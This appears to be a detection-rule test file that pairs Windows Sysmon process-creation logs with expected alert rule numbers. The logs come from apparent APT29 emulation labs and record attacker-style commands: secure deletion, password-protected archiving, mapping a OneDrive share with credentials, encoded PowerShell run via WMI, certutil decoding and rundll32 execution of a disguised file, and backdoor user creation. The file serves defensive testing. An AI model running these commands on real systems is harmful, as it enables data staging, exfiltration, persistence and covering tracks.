log 1 pass = { "win": { "eventdata": { "originalFileName": "sdelete.exe", "image": "C:\\\\Program Files\\\\SysinternalsSuite\\\\sdelete64.exe", "product": "Sysinternals Sdelete", "parentProcessGuid": "{1f43d37e-61e1-6172-e302-000000001300}", "description": "Secure file delete", "logonGuid": "{1f43d37e-60e7-6170-4430-050000000000}", "parentCommandLine": "powershell.exe", "processGuid": "{1f43d37e-636b-6172-f102-000000001300}", "logonId": "0x53044", "parentProcessId": "5612", "processId": "5216", "currentDirectory": "C:\\\\Program Files\\\\SysinternalsSuite\\\\", "utcTime": "2021-10-22 07:08:27.365", "hashes": "SHA1=97412DBA3CBEB0125C71B7B2AB194EA2FDFF51B2,MD5=E2114B1627889B250C7FD0425BA1BD54,SHA256=5434DFDB731238EDCB07A8C3A83594791536DDA7A63C29F19BE7BB1D59AEDD60,IMPHASH=CEB40AD3A90A0866598C1A508AFB7265", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Sysinternals - www.sysinternals.com", "commandLine": "\\\"C:\\\\Program Files\\\\SysinternalsSuite\\\\sdelete64.exe\\\" /accepteula C:\\\\Users\\\\adminuser\\\\AppData\\\\Roaming\\\\Draft.Zip", "integrityLevel": "Medium", "fileVersion": "2.04", "user": "DC\\\\adminuser", "terminalSessionId": "1" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2021-10-22 07:08:27.365\r\nProcessGuid: {1f43d37e-636b-6172-f102-000000001300}\r\nProcessId: 5216\r\nImage: C:\\Program Files\\SysinternalsSuite\\sdelete64.exe\r\nFileVersion: 2.04\r\nDescription: Secure file delete\r\nProduct: Sysinternals Sdelete\r\nCompany: Sysinternals - www.sysinternals.com\r\nOriginalFileName: sdelete.exe\r\nCommandLine: \"C:\\Program Files\\SysinternalsSuite\\sdelete64.exe\" /accepteula C:\\Users\\adminuser\\AppData\\Roaming\\Draft.Zip\r\nCurrentDirectory: C:\\Program Files\\SysinternalsSuite\\\r\nUser: DC\\adminuser\r\nLogonGuid: {1f43d37e-60e7-6170-4430-050000000000}\r\nLogonId: 0x53044\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=97412DBA3CBEB0125C71B7B2AB194EA2FDFF51B2,MD5=E2114B1627889B250C7FD0425BA1BD54,SHA256=5434DFDB731238EDCB07A8C3A83594791536DDA7A63C29F19BE7BB1D59AEDD60,IMPHASH=CEB40AD3A90A0866598C1A508AFB7265\r\nParentProcessGuid: {1f43d37e-61e1-6172-e302-000000001300}\r\nParentProcessId: 5612\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe\"", "version": "5", "systemTime": "2021-10-22T07:08:27.4167661Z", "eventRecordID": "39540", "threadID": "1096", "computer": "Workstation1.dc.local", "task": "1", "processID": "2352", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92063
alert = 6
decoder = json

[Powershell launched by binary in suspicious location]
log 1 pass = { "win": { "eventdata": { "originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft® Windows® Operating System", "parentProcessGuid": "{94f48244-2c56-6179-7101-000000001d00}", "description": "Windows PowerShell", "logonGuid": "{94f48244-2c56-6179-179f-560000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\Temp\\\\python.exe\\\"", "processGuid": "{94f48244-2e49-6179-7701-000000001d00}", "logonId": "0x569f17", "parentProcessId": "3552", "processId": "3976", "currentDirectory": "C:\\\\Windows\\\\system32\\\\", "utcTime": "2021-10-27 10:47:37.740", "hashes": "SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7", "parentImage": "C:\\\\Windows\\\\Temp\\\\python.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "powershell.exe", "integrityLevel": "Medium", "fileVersion": "10.0.19041.546 (WinBuild.160101.0800)", "user": "XRISBARNEY\\\\itadmin", "terminalSessionId": "1" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2021-10-27 10:47:37.740\r\nProcessGuid: {94f48244-2e49-6179-7701-000000001d00}\r\nProcessId: 3976\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: XRISBARNEY\\itadmin\r\nLogonGuid: {94f48244-2c56-6179-179f-560000000000}\r\nLogonId: 0x569F17\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\r\nParentProcessGuid: {94f48244-2c56-6179-7101-000000001d00}\r\nParentProcessId: 3552\r\nParentImage: C:\\Windows\\Temp\\python.exe\r\nParentCommandLine: \"C:\\Windows\\Temp\\python.exe\" \"", "version": "5", "systemTime": "2021-10-27T10:47:37.7562634Z", "eventRecordID": "116532", "threadID": "4092", "computer": "apt29w2.xrisbarney.local", "task": "1", "processID": "2720", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92065
alert = 6
decoder = json

[Rar.exe executed a compressed file creation command]
log 1 pass = { "win": { "eventdata": { "image": "C:\\\\Windows\\\\Temp\\\\Rar.exe", "product": "WinRAR", "parentProcessGuid": "{94f48244-2e49-6179-7701-000000001d00}", "description": "Command line RAR", "logonGuid": "{94f48244-2c56-6179-179f-560000000000}", "parentCommandLine": "powershell.exe", "processGuid": "{94f48244-2e83-6179-7901-000000001d00}", "logonId": "0x569f17", "parentProcessId": "3976", "processId": "3052", "currentDirectory": "C:\\\\Windows\\\\Temp\\\\", "utcTime": "2021-10-27 10:48:35.989", "hashes": "SHA1=FBFAA0AA1E0F6BE9987F896AF5F15B593EE1AD50,MD5=B891917AA5F7E2E9806F2BECEBE7C77B,SHA256=26D9212EC8DBCA45383EB95EC53C05357851BD7529FA0761D649F62E90C4E9FD,IMPHASH=B6CF226307A5F95763025E2880CDD028", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Alexander Roshal", "commandLine": "\\\"C:\\\\Windows\\\\Temp\\\\Rar.exe\\\" a -hpfGzq5yKw C:\\\\Users\\\\itadmin\\\\Desktop\\\\working.zip C:\\\\Users\\\\itadmin\\\\AppData\\\\Roaming\\\\working.zip", "integrityLevel": "Medium", "fileVersion": "5.71.0", "user": "XRISBARNEY\\\\itadmin", "terminalSessionId": "1" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2021-10-27 10:48:35.989\r\nProcessGuid: {94f48244-2e83-6179-7901-000000001d00}\r\nProcessId: 3052\r\nImage: C:\\Windows\\Temp\\Rar.exe\r\nFileVersion: 5.71.0\r\nDescription: Command line RAR\r\nProduct: WinRAR\r\nCompany: Alexander Roshal\r\nOriginalFileName: -\r\nCommandLine: \"C:\\Windows\\Temp\\Rar.exe\" a -hpfGzq5yKw C:\\Users\\itadmin\\Desktop\\working.zip C:\\Users\\itadmin\\AppData\\Roaming\\working.zip\r\nCurrentDirectory: C:\\Windows\\Temp\\\r\nUser: XRISBARNEY\\itadmin\r\nLogonGuid: {94f48244-2c56-6179-179f-560000000000}\r\nLogonId: 0x569F17\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=FBFAA0AA1E0F6BE9987F896AF5F15B593EE1AD50,MD5=B891917AA5F7E2E9806F2BECEBE7C77B,SHA256=26D9212EC8DBCA45383EB95EC53C05357851BD7529FA0761D649F62E90C4E9FD,IMPHASH=B6CF226307A5F95763025E2880CDD028\r\nParentProcessGuid: {94f48244-2e49-6179-7701-000000001d00}\r\nParentProcessId: 3976\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe\"", "version": "5", "systemTime": "2021-10-27T10:48:36.0293100Z", "eventRecordID": "116621", "threadID": "4092", "computer": "apt29w2.xrisbarney.local", "task": "1", "processID": "2720", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92067
alert = 6
decoder = json

[PSEXEC was used to execute another command]
log 1 pass = {"win":{"eventdata":{"image":"C:\\\\Windows\\\\Temp\\\\python.exe","parentProcessGuid":"{4dc16835-5bc7-6179-366a-2a0000000000}","logonGuid":"{4dc16835-5bc8-6179-25c8-2a0000000000}","parentCommandLine":"C:\\\\Windows\\\\PSEXESVC.exe","processGuid":"{4dc16835-5bc8-6179-d8ca-2a0000000000}","logonId":"0x2ac825","parentProcessId":"5136","processId":"5332","currentDirectory":"C:\\\\Windows\\\\system32\\\\","utcTime":"2021-10-27 14:01:44.811","hashes":"SHA1=585EB59D12A111E9291518C5CF5D3FD296C2B581,MD5=57292CE8714E2D221D9D97C9D061D332,SHA256=43782EC4337D8F3DDB7EA0C451B3BC4F212F84C8D5571BD0A842001C859A02AE,IMPHASH=00000000000000000000000000000000","parentImage":"C:\\\\Windows\\\\PSEXESVC.exe","ruleName":"technique_id=T1036,technique_name=Masquerading","commandLine":"\\\"C:\\\\Windows\\\\Temp\\\\python.exe\\\"","integrityLevel":"Medium","user":"EXCHANGETEST\\\\AtomicRed","terminalSessionId":"1"},"system":{"eventID":"1","keywords":"0x8000000000000000","providerGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","level":"4","channel":"Microsoft-Windows-Sysmon/Operational","opcode":"0","message":"\"Process Create:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2021-10-27 14:01:44.811\r\nProcessGuid: {4dc16835-5bc8-6179-d8ca-2a0000000000}\r\nProcessId: 5332\r\nImage: C:\\Windows\\Temp\\python.exe\r\nFileVersion: -\r\nDescription: -\r\nProduct: -\r\nCompany: -\r\nOriginalFileName: -\r\nCommandLine: \"C:\\Windows\\Temp\\python.exe\" \r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: EXCHANGETEST\\AtomicRed\r\nLogonGuid: {4dc16835-5bc8-6179-25c8-2a0000000000}\r\nLogonId: 0x2AC825\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=585EB59D12A111E9291518C5CF5D3FD296C2B581,MD5=57292CE8714E2D221D9D97C9D061D332,SHA256=43782EC4337D8F3DDB7EA0C451B3BC4F212F84C8D5571BD0A842001C859A02AE,IMPHASH=00000000000000000000000000000000\r\nParentProcessGuid: {4dc16835-5bc7-6179-366a-2a0000000000}\r\nParentProcessId: 5136\r\nParentImage: C:\\Windows\\PSEXESVC.exe\r\nParentCommandLine: C:\\Windows\\PSEXESVC.exe\"","version":"5","systemTime":"2021-10-27T14:01:45.0056864Z","eventRecordID":"200618","threadID":"3144","computer":"cfo.ExchangeTest.com","task":"1","processID":"2220","severityValue":"INFORMATION","providerName":"Microsoft-Windows-Sysmon"}}}
rule = 92068
alert = 3
decoder = json

[A connection to cloud resource was started]
log 1 pass = { "win": { "eventdata": { "originalFileName": "net.exe", "image": "C:\\\\Windows\\\\System32\\\\net.exe", "product": "Microsoft® Windows® Operating System", "parentProcessGuid": "{94f48244-f5f0-6184-1f07-000000002200}", "description": "Net Command", "logonGuid": "{94f48244-4336-6182-7ded-150000000000}", "parentCommandLine": "powershell.exe", "processGuid": "{94f48244-f7bb-6184-3507-000000002200}", "logonId": "0x15ed7d", "parentProcessId": "2812", "processId": "5352", "currentDirectory": "C:\\\\Users\\\\itadmin\\\\Desktop\\\\", "utcTime": "2021-11-05 09:22:03.236", "hashes": "SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1018,technique_name=Remote System Discovery", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\Windows\\\\system32\\\\net.exe\\\" use y: https://d.docs.live.net/8BF025F44898DDEE /user:christestapt29@outlook.com password", "integrityLevel": "Medium", "fileVersion": "10.0.19041.1 (WinBuild.160101.0800)", "user": "XRISBARNEY\\\\itadmin", "terminalSessionId": "1" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2021-11-05 09:22:03.236\r\nProcessGuid: {94f48244-f7bb-6184-3507-000000002200}\r\nProcessId: 5352\r\nImage: C:\\Windows\\System32\\net.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net.exe\r\nCommandLine: \"C:\\Windows\\system32\\net.exe\" use y: https://d.docs.live.net/8BF025F44898DDEE /user:christestapt29@outlook.com password\r\nCurrentDirectory: C:\\Users\\itadmin\\Desktop\\\r\nUser: XRISBARNEY\\itadmin\r\nLogonGuid: {94f48244-4336-6182-7ded-150000000000}\r\nLogonId: 0x15ED7D\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07\r\nParentProcessGuid: {94f48244-f5f0-6184-1f07-000000002200}\r\nParentProcessId: 2812\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe\"", "version": "5", "systemTime": "2021-11-05T09:22:03.2403640Z", "eventRecordID": "231959", "threadID": "4080", "computer": "apt29w2.xrisbarney.local", "task": "1", "processID": "2832", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92038
alert = 12
decoder = json

[A powershell process created by WMI executed a base64 encoded command]
log 1 pass = { "win": { "eventdata": { "originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft® Windows® Operating System", "parentProcessGuid": "{94f48244-81ae-6180-6d01-000000002100}", "description": "Windows PowerShell", "logonGuid": "{94f48244-1a96-6180-ee21-070000000000}", "parentCommandLine": "C:\\\\Windows\\\\system32\\\\wbem\\\\wmiprvse.exe -secured -Embedding", "processGuid": "{94f48244-81af-6180-6e01-000000002100}", "logonId": "0x721ee", "parentProcessId": "6044", "processId": "5740", "currentDirectory": "C:\\\\Windows\\\\system32\\\\", "utcTime": "2021-11-02 00:09:19.663", "hashes": "SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7", "parentImage": "C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe", "ruleName": "technique_id=T1047,technique_name=Windows Management Instrumentation", "company": "Microsoft Corporation", "commandLine": "powershell.exe -enc base64text", "integrityLevel": "High", "fileVersion": "10.0.19041.546 (WinBuild.160101.0800)", "user": "XRISBARNEY\\\\itadmin", "terminalSessionId": "1" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\r\nUtcTime: 2021-11-02 00:09:19.663\r\nProcessGuid: {94f48244-81af-6180-6e01-000000002100}\r\nProcessId: 5740\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -enc base64text\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: XRISBARNEY\\itadmin\r\nLogonGuid: {94f48244-1a96-6180-ee21-070000000000}\r\nLogonId: 0x721EE\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=F43D9BB316E30AE1A3494AC5B0624F6BEA1BF054,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\r\nParentProcessGuid: {94f48244-81ae-6180-6d01-000000002100}\r\nParentProcessId: 6044\r\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\nParentCommandLine: C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\"", "version": "5", "systemTime": "2021-11-02T00:09:19.6824381Z", "eventRecordID": "210117", "threadID": "3608", "computer": "apt29w2.xrisbarney.local", "task": "1", "processID": "2332", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92071
alert = 12
decoder = json

[Powershell executing certutil to decode a file]
log 1 pass = { "win": { "eventdata": { "originalFileName": "CertUtil.exe", "image": "C:\\\\Windows\\\\System32\\\\certutil.exe", "product": "Microsoft® Windows® Operating System", "parentProcessGuid": "{1f43d37e-0bf7-6180-6602-000000001d00}", "description": "CertUtil.exe", "logonGuid": "{1f43d37e-e11c-617f-5ac2-120000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" Get-Content '.\\\\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX", "processGuid": "{1f43d37e-0c6b-6180-8402-000000001d00}", "logonId": "0x12c25a", "parentProcessId": "5712", "processId": "3036", "currentDirectory": "C:\\\\Users\\\\workstation1\\\\Desktop\\\\", "utcTime": "2021-11-01 15:48:59.834", "hashes": "SHA1=70E89852F023AB7CDE0173EDA1208DBB580F1E4F,MD5=BD8D9943A9B1DEF98EB83E0FA48796C2,SHA256=8DE7B4EB1301D6CBE4EA2C8D13B83280453EB64E3B3C80756BBD1560D65CA4D2,IMPHASH=7B7F7ED372C027216AE5100589C424EA", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\Windows\\\\system32\\\\certutil.exe\\\" -decode blob C:\\\\Users\\\\workstation1\\\\AppData\\\\Roaming\\\\Microsoft\\\\kxwn.lock", "integrityLevel": "Medium", "fileVersion": "10.0.19041.1 (WinBuild.160101.0800)", "user": "DC\\\\workstation1", "terminalSessionId": "1" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2021-11-01 15:48:59.834\r\nProcessGuid: {1f43d37e-0c6b-6180-8402-000000001d00}\r\nProcessId: 3036\r\nImage: C:\\Windows\\System32\\certutil.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: CertUtil.exe\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CertUtil.exe\r\nCommandLine: \"C:\\Windows\\system32\\certutil.exe\" -decode blob C:\\Users\\workstation1\\AppData\\Roaming\\Microsoft\\kxwn.lock\r\nCurrentDirectory: C:\\Users\\workstation1\\Desktop\\\r\nUser: DC\\workstation1\r\nLogonGuid: {1f43d37e-e11c-617f-5ac2-120000000000}\r\nLogonId: 0x12C25A\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=70E89852F023AB7CDE0173EDA1208DBB580F1E4F,MD5=BD8D9943A9B1DEF98EB83E0FA48796C2,SHA256=8DE7B4EB1301D6CBE4EA2C8D13B83280453EB64E3B3C80756BBD1560D65CA4D2,IMPHASH=7B7F7ED372C027216AE5100589C424EA\r\nParentProcessGuid: {1f43d37e-0bf7-6180-6602-000000001d00}\r\nParentProcessId: 5712\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" Get-Content '.\\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX\"", "version": "5", "systemTime": "2021-11-01T15:48:59.8371735Z", "eventRecordID": "112420", "threadID": "3152", "computer": "Workstation1.dc.local", "task": "1", "processID": "2284", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92073
alert = 6
decoder = json

[Rundll32 executing suspicious .lock file, possible persistence tactic]
log 1 pass = { "win": { "eventdata": { "originalFileName": "RUNDLL32.EXE", "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe", "product": "Microsoft® Windows® Operating System", "parentProcessGuid": "{1f43d37e-0288-6189-6100-000000002100}", "description": "Windows host process (Rundll32)", "logonGuid": "{1f43d37e-0244-6189-6939-060000000000}", "parentCommandLine": "C:\\\\Windows\\\\Explorer.EXE", "processGuid": "{1f43d37e-02c3-6189-8200-000000002100}", "logonId": "0x63969", "parentProcessId": "2476", "processId": "4272", "currentDirectory": "C:\\\\Windows\\\\system32\\\\", "utcTime": "2021-11-08 10:58:11.816", "hashes": "SHA1=DD399AE46303343F9F0DA189AEE11C67BD868222,MD5=EF3179D498793BF4234F708D3BE28633,SHA256=B53F3C0CD32D7F20849850768DA6431E5F876B7BFA61DB0AA0700B02873393FA,IMPHASH=4DB27267734D1576D75C991DC70F68AC", "parentImage": "C:\\\\Windows\\\\explorer.exe", "ruleName": "technique_id=T1204,technique_name=User Execution", "company": "Microsoft Corporation", "commandLine": "\\\"C:\\\\Windows\\\\System32\\\\rundll32.exe\\\" C:\\\\Users\\\\workstation1\\\\AppData\\\\Roaming\\\\Microsoft\\\\kxwn.lock,VoidFunc", "integrityLevel": "Medium", "fileVersion": "10.0.19041.746 (WinBuild.160101.0800)", "user": "DC\\\\workstation1", "terminalSessionId": "1" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2021-11-08 10:58:11.816\r\nProcessGuid: {1f43d37e-02c3-6189-8200-000000002100}\r\nProcessId: 4272\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows host process (Rundll32)\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: RUNDLL32.EXE\r\nCommandLine: \"C:\\Windows\\System32\\rundll32.exe\" C:\\Users\\workstation1\\AppData\\Roaming\\Microsoft\\kxwn.lock,VoidFunc\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DC\\workstation1\r\nLogonGuid: {1f43d37e-0244-6189-6939-060000000000}\r\nLogonId: 0x63969\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=DD399AE46303343F9F0DA189AEE11C67BD868222,MD5=EF3179D498793BF4234F708D3BE28633,SHA256=B53F3C0CD32D7F20849850768DA6431E5F876B7BFA61DB0AA0700B02873393FA,IMPHASH=4DB27267734D1576D75C991DC70F68AC\r\nParentProcessGuid: {1f43d37e-0288-6189-6100-000000002100}\r\nParentProcessId: 2476\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE\"", "version": "5", "systemTime": "2021-11-08T10:58:12.3979760Z", "eventRecordID": "142015", "threadID": "3304", "computer": "Workstation1.dc.local", "task": "1", "processID": "2252", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92076
alert = 6
decoder = json

[net.exe executed a user creation command]
log 1 pass = { "win": { "eventdata": { "originalFileName": "net1.exe", "image": "C:\\\\Windows\\\\System32\\\\net1.exe", "product": "Microsoft® Windows® Operating System", "parentProcessGuid": "{94f48244-67eb-6189-f100-000000002800}", "description": "Net Command", "logonGuid": "{94f48244-6579-6189-296f-1f0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\system32\\\\net.exe\\\" user /add toby pamBeesly&lt;3", "processGuid": "{94f48244-67eb-6189-f300-000000002800}", "logonId": "0x1f6f29", "parentProcessId": "2820", "processId": "5668", "currentDirectory": "C:\\\\Users\\\\itadmin\\\\Documents\\\\", "utcTime": "2021-11-08 18:09:47.315", "hashes": "SHA1=FA29205A40D3CBC69946784946C75EB66AFD9950,MD5=BA0BCCC6029FBBE6D8B41197F252742F,SHA256=253E6148EC7A95EA3950E032F9DEF1EC7C0E0CD172CC6D770D2807A64FC4A7CA,IMPHASH=41DBA1AF77E1A2260F0CE46D59ADCB5E", "parentImage": "C:\\\\Windows\\\\System32\\\\net.exe", "ruleName": "technique_id=T1018,technique_name=Remote System Discovery", "company": "Microsoft Corporation", "commandLine": "C:\\\\Windows\\\\system32\\\\net1 user /add toby pamBeesly&lt;3", "integrityLevel": "High", "fileVersion": "10.0.19041.844 (WinBuild.160101.0800)", "user": "XRISBARNEY\\\\itadmin", "terminalSessionId": "0" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2021-11-08 18:09:47.315\r\nProcessGuid: {94f48244-67eb-6189-f300-000000002800}\r\nProcessId: 5668\r\nImage: C:\\Windows\\System32\\net1.exe\r\nFileVersion: 10.0.19041.844 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net1.exe\r\nCommandLine: C:\\Windows\\system32\\net1 user /add toby pamBeesly<3\r\nCurrentDirectory: C:\\Users\\itadmin\\Documents\\\r\nUser: XRISBARNEY\\itadmin\r\nLogonGuid: {94f48244-6579-6189-296f-1f0000000000}\r\nLogonId: 0x1F6F29\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=FA29205A40D3CBC69946784946C75EB66AFD9950,MD5=BA0BCCC6029FBBE6D8B41197F252742F,SHA256=253E6148EC7A95EA3950E032F9DEF1EC7C0E0CD172CC6D770D2807A64FC4A7CA,IMPHASH=41DBA1AF77E1A2260F0CE46D59ADCB5E\r\nParentProcessGuid: {94f48244-67eb-6189-f100-000000002800}\r\nParentProcessId: 2820\r\nParentImage: C:\\Windows\\System32\\net.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\net.exe\" user /add toby pamBeesly<3\"", "version": "5", "systemTime": "2021-11-08T18:09:47.3258421Z", "eventRecordID": "202606", "threadID": "3660", "computer": "apt29w1.xrisbarney.local", "task": "1", "processID": "2380", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92040
alert = 12
decoder = json

[curl.exe launched from powershell created a binary file]
